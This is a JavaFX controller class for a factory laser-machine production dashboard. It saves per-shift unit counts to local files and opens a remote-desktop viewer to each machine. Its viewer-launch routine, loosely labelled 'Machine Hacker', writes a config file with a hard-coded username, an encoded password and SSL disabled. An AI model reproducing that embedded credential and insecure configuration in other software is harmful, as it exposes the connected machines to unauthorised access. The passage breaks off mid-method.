

import com.gluonhq.charm.glisten.animation.PulseTransition;
import com.jfoenix.controls.JFXButton;
import com.jfoenix.controls.JFXTextArea;
import com.jfoenix.controls.JFXTextField;
import java.awt.Desktop;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.ResourceBundle;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import static java.util.concurrent.TimeUnit.MILLISECONDS;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.application.Platform;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.fxml.Initializable;
import javafx.geometry.Pos;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.Accordion;
import javafx.scene.control.Alert;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.control.DialogPane;
import javafx.scene.control.Label;
import javafx.scene.control.Tooltip;
import javafx.scene.effect.DropShadow;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.Pane;
import javafx.scene.layout.StackPane;
import javafx.scene.layout.VBox;
import javafx.scene.paint.Color;
import javafx.scene.paint.ImagePattern;
import javafx.scene.shape.Rectangle;
import javafx.stage.Stage;
import javafx.util.Duration;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.UnsupportedAudioFileException;
import org.apache.commons.io.FileUtils;
import org.apache.commons.lang3.StringUtils;
import org.controlsfx.control.Notifications;

/**
 * FXML Controller class
 *
 * @author ahmed.elkady
 */
public class ViewerController_New implements Initializable {
    
    Connection conn_write=null;
    ResultSet rs_write=null;
    PreparedStatement pst_write=null;
    

    
    
    @FXML
    private JFXTextField allgarments;

    @FXML
    private JFXTextField allperformance;

    @FXML
    private JFXButton refresh;

    @FXML
    private JFXTextField dateoftoday;

    @FXML
    private ImageView tandcicon;

    @FXML
    private Label mno1;

    @FXML
    private JFXTextField nog1;

    @FXML
    private JFXTextField eff1;

    @FXML
    private JFXTextField mod1;

    @FXML
    private JFXTextField unit1;

    @FXML
    private Label mno11;

    @FXML
    private JFXTextField nog11;

    @FXML
    private JFXTextField eff11;

    @FXML
    private JFXTextField mod11;

    @FXML
    private JFXTextField unit11;

    @FXML
    private Label mno12;

    @FXML
    private JFXTextField nog12;

    @FXML
    private JFXTextField eff12;

    @FXML
    private JFXTextField mod12;

    @FXML
    private JFXTextField unit12;

    @FXML
    private Label mno13;

    @FXML
    private JFXTextField nog13;

    @FXML
    private JFXTextField eff13;

    @FXML
    private JFXTextField mod13;

    @FXML
    private JFXTextField unit13;

    @FXML
    private Label mno14;

    @FXML
    private JFXTextField nog14;

    @FXML
    private JFXTextField eff14;

    @FXML
    private JFXTextField mod14;

    @FXML
    private JFXTextField unit14;

    @FXML
    private Label mno15;

    @FXML
    private JFXTextField nog15;

    @FXML
    private JFXTextField eff15;

    @FXML
    private JFXTextField mod15;

    @FXML
    private JFXTextField unit15;

    @FXML
    private Label mno16;

    @FXML
    private JFXTextField nog16;

    @FXML
    private JFXTextField eff16;

    @FXML
    private JFXTextField mod16;

    @FXML
    private JFXTextField unit16;

    @FXML
    private Label mno17;

    @FXML
    private JFXTextField nog17;

    @FXML
    private JFXTextField eff17;

    @FXML
    private JFXTextField mod17;

    @FXML
    private JFXTextField unit17;

    @FXML
    private Label mno18;

    @FXML
    private JFXTextField nog18;

    @FXML
    private JFXTextField eff18;

    @FXML
    private JFXTextField mod18;

    @FXML
    private JFXTextField unit18;

    @FXML
    private Label mno19;

    @FXML
    private JFXTextField nog19;

    @FXML
    private JFXTextField eff19;

    @FXML
    private JFXTextField mod19;

    @FXML
    private JFXTextField unit19;

    @FXML
    private Label mno110;

    @FXML
    private JFXTextField nog110;

    @FXML
    private JFXTextField eff110;

    @FXML
    private JFXTextField mod110;

    @FXML
    private JFXTextField unit110;

    @FXML
    private Label mno111;

    @FXML
    private JFXTextField nog111;

    @FXML
    private JFXTextField eff111;

    @FXML
    private JFXTextField mod111;

    @FXML
    private JFXTextField unit111;

    @FXML
    private Label mno112;

    @FXML
    private JFXTextField nog112;

    @FXML
    private JFXTextField eff112;

    @FXML
    private JFXTextField mod112;

    @FXML
    private JFXTextField unit112;

    @FXML
    private Label mno113;

    @FXML
    private JFXTextField nog113;

    @FXML
    private JFXTextField eff113;

    @FXML
    private JFXTextField mod113;

    @FXML
    private JFXTextField unit113;

    @FXML
    private Label mno114;

    @FXML
    private JFXTextField nog114;

    @FXML
    private JFXTextField eff114;

    @FXML
    private JFXTextField mod114;

    @FXML
    private JFXTextField unit114;

    @FXML
    private Label mno115;

    @FXML
    private JFXTextField nog115;

    @FXML
    private JFXTextField eff115;

    @FXML
    private JFXTextField mod115;

    @FXML
    private JFXTextField unit115;

    @FXML
    private Label mno116;

    @FXML
    private JFXTextField nog116;

    @FXML
    private JFXTextField eff116;

    @FXML
    private JFXTextField mod116;

    @FXML
    private JFXTextField unit116;

    @FXML
    private Label mno117;
    
    @FXML
    private Label launchdate;

    @FXML
    private JFXTextField nog117;

    @FXML
    private JFXTextField eff117;

    @FXML
    private JFXTextField mod117;

    @FXML
    private JFXTextField unit117;
    
    
    @FXML
    private JFXTextField nog118;

    @FXML
    private JFXTextField eff118;

    @FXML
    private JFXTextField mod118;

    @FXML
    private JFXTextField unit118;

    @FXML
    private Label mno118;
    
    
    
    @FXML
    private JFXTextField nog119;

    @FXML
    private JFXTextField eff119;

    @FXML
    private JFXTextField mod119;

    @FXML
    private JFXTextField unit119;

    @FXML
    private Label mno119;
    
    
    @FXML
    private JFXTextField nog120;

    @FXML
    private JFXTextField eff120;

    @FXML
    private JFXTextField mod120;

    @FXML
    private JFXTextField unit120;

    @FXML
    private Label mno120;
    
    
    @FXML
    private JFXTextField nog121;

    @FXML
    private JFXTextField eff121;

    @FXML
    private JFXTextField mod121;

    @FXML
    private JFXTextField unit121;

    @FXML
    private Label mno121;
    
    
    
    
    
    @FXML
    private StackPane zeros;
    
    @FXML
    private VBox vboxpane1;
    
    @FXML
    private VBox vboxpane2;
    
    @FXML
    private VBox vboxpane3;
    
    @FXML
    private VBox vboxpane4;
    
    @FXML
    private VBox vboxpane5;
    
    @FXML
    private VBox vboxpane6;
    
    @FXML
    private VBox vboxpane7;
    
    @FXML
    private VBox vboxpane8;
    
    @FXML
    private VBox vboxpane9;
    
    @FXML
    private VBox vboxpane10;
    
    @FXML
    private VBox vboxpane11;
    
    @FXML
    private VBox vboxpane12;
    
    @FXML
    private VBox vboxpane13;
    
    @FXML
    private VBox vboxpane14;
    
    @FXML
    private VBox vboxpane15;
    
    @FXML
    private VBox vboxpane16;
    
    @FXML
    private VBox vboxpane17;
    
    @FXML
    private VBox vboxpane18;
    
    @FXML
    private VBox vboxpane19;
    
    @FXML
    private VBox vboxpane20;
    
    @FXML
    private VBox vboxpane21;
    
    @FXML
    private VBox vboxpane22;
    
   @FXML
    private JFXTextArea areatoupdate,readwrite;
   
   
    @FXML
    private Rectangle rectangle;
    
  //  public static BufferedReader buffr;
   
   
    @FXML
    private Pane refresh1,refresh11,refresh12,refresh13,refresh14,refresh15,refresh16,refresh17,refresh18,refresh19,
            refresh110,refresh111,refresh112,refresh113,refresh114,refresh115,refresh116,refresh117,refresh118,refresh119,refresh120,refresh121; 
    
    
    
    public  int summe1=0;
    public  int summe2=0;
    public  int summe3=0;
    public  int summe4=0;
    public  int summe5=0;
    public  int summe6=0;
    public  int summe7=0;
    public  int summe8=0;
    public  int summe9=0;
    public  int summe10=0;
    public  int summe11=0;
    public  int summe12=0;
    public  int summe13=0;
    public  int summe14=0;
    public  int summe15=0;
    public  int summe16=0;
    public  int summe17=0;
    public  int summe18=0;
    public  int summe19=0;
    public  int summe20=0;
    public  int summe21=0;
    public  int summe22=0;
    
    
    
    public static String summe111;
    public static String summe222;
    public static String summe333;
    public static String summe444;
    public static String summe555;
    public static String summe666;
    public static String summe777;
    public static String summe888;
    public static String summe999;
    public static String summe101010;
    public static String summe111111;
    public static String summe121212;
    public static String summe131313;
    public static String summe141414;
    public static String summe151515;
    public static String summe161616;
    public static String summe171717;
    public static String summe181818;
    public static String summe191919;
    public static String summe202020;
    public static String summe212121;
    public static String summe222222;
    
    
    
    
   // public String unitoo1,modeloo1,timeoo1;
    
    
    
    public int workingmachinesno=0;
    
    public static String poth;
    
    
    
    @FXML
    void helpaction(ActionEvent event) throws IOException {
        
    Stage stg = new Stage();
    Parent root = FXMLLoader.<Parent>load(getClass().getResource("Help.fxml"));
    Scene sce = new Scene(root);
    stg.setTitle("Help");
    //stg.setResizable(false);
    stg.setScene(sce);
    stg.centerOnScreen();
    //stg.getIcons().add(new javafx.scene.image.Image(Main.class.getResourceAsStream(".png")));
    stg.show();
        
    }
    
    @FXML
    void aboutaction(ActionEvent event) throws IOException {
        
    Stage stg = new Stage();
    Parent root = FXMLLoader.<Parent>load(getClass().getResource("About.fxml"));
    Scene sce = new Scene(root);
    stg.setTitle("About");
    //stg.setResizable(false);
    stg.setScene(sce);
    stg.centerOnScreen();
    //stg.getIcons().add(new javafx.scene.image.Image(Main.class.getResourceAsStream(".png")));
    stg.show();
        
    }
    
    @FXML
    void exitaction(ActionEvent event) throws IOException {
        
        Platform.exit();
        
    }
    
    @FXML
    void newshiftaction(ActionEvent event) throws IOException {
        
        
      File godel=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");   
       
      FileUtils.deleteDirectory(godel);
      
      
      
      ///////////////////////////////////////////////////
      
    //////  Calculate for new shift
      
      //Get Unit values here
      
//      summe1=Integer.parseInt(unit1.getText());
//      summe2=Integer.parseInt(unit11.getText());
//      summe3=Integer.parseInt(unit12.getText());
//      summe4=Integer.parseInt(unit13.getText());
//      summe5=Integer.parseInt(unit14.getText());
//      summe6=Integer.parseInt(unit15.getText());
//      summe7=Integer.parseInt(unit16.getText());
//      summe8=Integer.parseInt(unit17.getText());
//      summe9=Integer.parseInt(unit18.getText());
//      summe10=Integer.parseInt(unit19.getText());
//      
//      summe11=Integer.parseInt(unit110.getText());
//      summe12=Integer.parseInt(unit111.getText());
//      summe13=Integer.parseInt(unit112.getText());
//      summe14=Integer.parseInt(unit113.getText());
//      summe15=Integer.parseInt(unit114.getText());
//      summe16=Integer.parseInt(unit115.getText());
//      summe17=Integer.parseInt(unit116.getText());
//      summe18=Integer.parseInt(unit117.getText());
//      summe19=Integer.parseInt(unit118.getText());
//      summe20=Integer.parseInt(unit119.getText());
      
      //Write in file then read to summe in starting.
      
      File hn=new File (System.getProperty("user.home")+"\\Laser_Shifts");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx1=new File (hn+"\\summe1.txt");
           if (!cx1.exists()) {
               cx1.createNewFile();
               
               //Do something
               
               PrintWriter pca=new PrintWriter (new FileWriter (cx1));
               pca.print(unit1.getText());
               pca.close();
           }
           else {
               //Do something
               
               PrintWriter pca=new PrintWriter (new FileWriter (cx1));
               pca.print(unit1.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx2=new File (hn+"\\summe2.txt");
           if (!cx2.exists()) {
               cx2.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx2));
               pca.print(unit11.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx2));
               pca.print(unit11.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx3=new File (hn+"\\summe3.txt");
           if (!cx3.exists()) {
               cx3.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx3));
               pca.print(unit12.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx3));
               pca.print(unit12.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx4=new File (hn+"\\summe4.txt");
           if (!cx4.exists()) {
               cx4.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx4));
               pca.print(unit13.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx4));
               pca.print(unit13.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx5=new File (hn+"\\summe5.txt");
           if (!cx5.exists()) {
               cx5.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx5));
               pca.print(unit14.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx5));
               pca.print(unit14.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx6=new File (hn+"\\summe6.txt");
           if (!cx6.exists()) {
               cx6.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx6));
               pca.print(unit15.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx6));
               pca.print(unit15.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx7=new File (hn+"\\summe7.txt");
           if (!cx7.exists()) {
               cx7.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx7));
               pca.print(unit16.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx7));
               pca.print(unit16.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx8=new File (hn+"\\summe8.txt");
           if (!cx8.exists()) {
               cx8.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx8));
               pca.print(unit17.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx8));
               pca.print(unit17.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx9=new File (hn+"\\summe9.txt");
           if (!cx9.exists()) {
               cx9.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx9));
               pca.print(unit18.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx9));
               pca.print(unit18.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx10=new File (hn+"\\summe10.txt");
           if (!cx10.exists()) {
               cx10.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx10));
               pca.print(unit19.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx10));
               pca.print(unit19.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx11=new File (hn+"\\summe11.txt");
           if (!cx11.exists()) {
               cx11.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx11));
               pca.print(unit110.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx11));
               pca.print(unit110.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx12=new File (hn+"\\summe12.txt");
           if (!cx12.exists()) {
               cx12.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx12));
               pca.print(unit111.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx12));
               pca.print(unit111.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx13=new File (hn+"\\summe13.txt");
           if (!cx13.exists()) {
               cx13.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx13));
               pca.print(unit112.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx13));
               pca.print(unit112.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx14=new File (hn+"\\summe14.txt");
           if (!cx14.exists()) {
               cx14.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx14));
               pca.print(unit113.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx14));
               pca.print(unit113.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx15=new File (hn+"\\summe15.txt");
           if (!cx15.exists()) {
               cx15.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx15));
               pca.print(unit114.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx15));
               pca.print(unit114.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx16=new File (hn+"\\summe16.txt");
           if (!cx16.exists()) {
               cx16.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx16));
               pca.print(unit115.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx16));
               pca.print(unit115.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx17=new File (hn+"\\summe17.txt");
           if (!cx17.exists()) {
               cx17.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx17));
               pca.print(unit116.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx17));
               pca.print(unit116.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx18=new File (hn+"\\summe18.txt");
           if (!cx18.exists()) {
               cx18.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx18));
               pca.print(unit117.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx18));
               pca.print(unit117.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx19=new File (hn+"\\summe19.txt");
           if (!cx19.exists()) {
               cx19.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx19));
               pca.print(unit118.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx19));
               pca.print(unit118.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           File cx20=new File (hn+"\\summe20.txt");
           if (!cx20.exists()) {
               cx20.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx20));
               pca.print(unit119.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx20));
               pca.print(unit119.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           
           ///////////////////////////////////
           File cx21=new File (hn+"\\summe21.txt");
           if (!cx21.exists()) {
               cx21.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx21));
               pca.print(unit120.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx21));
               pca.print(unit120.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           
           ///////////////////////////////////
           File cx22=new File (hn+"\\summe22.txt");
           if (!cx22.exists()) {
               cx22.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx22));
               pca.print(unit121.getText());
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx22));
               pca.print(unit121.getText());
               pca.close();
               
           }
           ///////////////////////////////////
           
      
      ////////////////////////////////////////////////////
      
      
//      Notifications noti = Notifications.create();
//      noti.title("Successful");
//      noti.text("We have refreshed our production for the new shift");
//      noti.hideAfter(Duration.seconds(3));
//      noti.position(Pos.CENTER);
//      noti.showInformation();
//      
//      
      
      
      
      
        
        
    }
    
    @FXML
    void zerosaction(ActionEvent event) throws IOException {
        
        
         
            /////////////////////////////////////////////////////////////////////////
           try { 
            
            File hn=new File (System.getProperty("user.home")+"\\Laser_Shifts");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx1=new File (hn+"\\summe1.txt");
           if (!cx1.exists()) {
               cx1.createNewFile();
               
               //Do something
               
               PrintWriter pca=new PrintWriter (new FileWriter (cx1));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               
               PrintWriter pca=new PrintWriter (new FileWriter (cx1));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx2=new File (hn+"\\summe2.txt");
           if (!cx2.exists()) {
               cx2.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx2));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx2));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx3=new File (hn+"\\summe3.txt");
           if (!cx3.exists()) {
               cx3.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx3));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx3));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx4=new File (hn+"\\summe4.txt");
           if (!cx4.exists()) {
               cx4.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx4));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx4));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx5=new File (hn+"\\summe5.txt");
           if (!cx5.exists()) {
               cx5.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx5));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx5));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx6=new File (hn+"\\summe6.txt");
           if (!cx6.exists()) {
               cx6.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx6));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx6));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx7=new File (hn+"\\summe7.txt");
           if (!cx7.exists()) {
               cx7.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx7));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx7));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx8=new File (hn+"\\summe8.txt");
           if (!cx8.exists()) {
               cx8.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx8));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx8));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx9=new File (hn+"\\summe9.txt");
           if (!cx9.exists()) {
               cx9.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx9));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx9));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx10=new File (hn+"\\summe10.txt");
           if (!cx10.exists()) {
               cx10.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx10));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx10));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx11=new File (hn+"\\summe11.txt");
           if (!cx11.exists()) {
               cx11.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx11));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx11));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx12=new File (hn+"\\summe12.txt");
           if (!cx12.exists()) {
               cx12.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx12));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx12));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx13=new File (hn+"\\summe13.txt");
           if (!cx13.exists()) {
               cx13.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx13));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx13));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx14=new File (hn+"\\summe14.txt");
           if (!cx14.exists()) {
               cx14.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx14));
               pca.print(("0"));
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx14));
               pca.print(("0"));
               pca.close();
               
           }
           ///////////////////////////////////
           File cx15=new File (hn+"\\summe15.txt");
           if (!cx15.exists()) {
               cx15.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx15));
               pca.print(("0"));
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx15));
               pca.print(("0"));
               pca.close();
               
           }
           ///////////////////////////////////
           File cx16=new File (hn+"\\summe16.txt");
           if (!cx16.exists()) {
               cx16.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx16));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx16));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx17=new File (hn+"\\summe17.txt");
           if (!cx17.exists()) {
               cx17.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx17));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx17));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx18=new File (hn+"\\summe18.txt");
           if (!cx18.exists()) {
               cx18.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx18));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx18));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx19=new File (hn+"\\summe19.txt");
           if (!cx19.exists()) {
               cx19.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx19));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx19));
               pca.print("0");
               pca.close();
               
           }
           ///////////////////////////////////
           File cx20=new File (hn+"\\summe20.txt");
           if (!cx20.exists()) {
               cx20.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx20));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx20));
               pca.print("0");
               pca.close();
               
           }
           //////////////////////////////////////
           ///////////////////////////////////
           File cx21=new File (hn+"\\summe21.txt");
           if (!cx21.exists()) {
               cx21.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx21));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx21));
               pca.print("0");
               pca.close();
               
           }
           //////////////////////////////////////
           ///////////////////////////////////
           File cx22=new File (hn+"\\summe22.txt");
           if (!cx22.exists()) {
               cx22.createNewFile();
               
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx22));
               pca.print("0");
               pca.close();
           }
           else {
               //Do something
               PrintWriter pca=new PrintWriter (new FileWriter (cx22));
               pca.print("0");
               pca.close();
               
           }
           //////////////////////////////////////
           
           
           }
           
           catch (Exception m) {
               
           }
           /////////////////////////////////
           
//      Notifications noti = Notifications.create();
//      noti.title("Successful");
//      noti.text("We have added zeros to all successfully.");
//      noti.hideAfter(Duration.seconds(3));
//      noti.position(Pos.CENTER);
//      noti.showInformation();
//      
        
           
        
    }
    
    
    ////////////////////////////////////////////Machine Hacker/////////////////////////////////////////////////////////
    
    
    @FXML
    void viewerhackeraction1(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane1.getId();
       String nummy=ido.replace("vboxpane","");
       BufferedReader za=new BufferedReader (new FileReader ("Machines_Conn_Data\\info"+nummy+".kady"));
       String ippa=za.readLine().toString();
       String porte=za.readLine().toString();
       za.close();
       PrintWriter psa=new PrintWriter (new FileWriter ("viewer.conf"));
       psa.print("#kadinio viewer configuration file\n" +
"#Thu May 09 07:54:53 EET 2024\n" +
"default-address=false\n" +
"multihomed-enabled=false\n" +
"server-address="+ippa+"\n" +
"username=kady\n" +
"ssl-enabled=false\n" +
"server-port="+porte+"\n" +
"reverse-connection=false\n" +
"password=YQKQgI26amA\\=\n" +
"http-port=6666");
        psa.close();  
        Thread.sleep(1000);
        jrdesktop.viewer.ConnectionDialog ui=new jrdesktop.viewer.ConnectionDialog ();
        ui.setVisible(true);
        
    }
        
    
    @FXML
    void viewerhackeraction2(MouseEvent event) throws IOException, InterruptedException  {
       String ido=vboxpane2.getId();
       String nummy=ido.replace("vboxpane","");
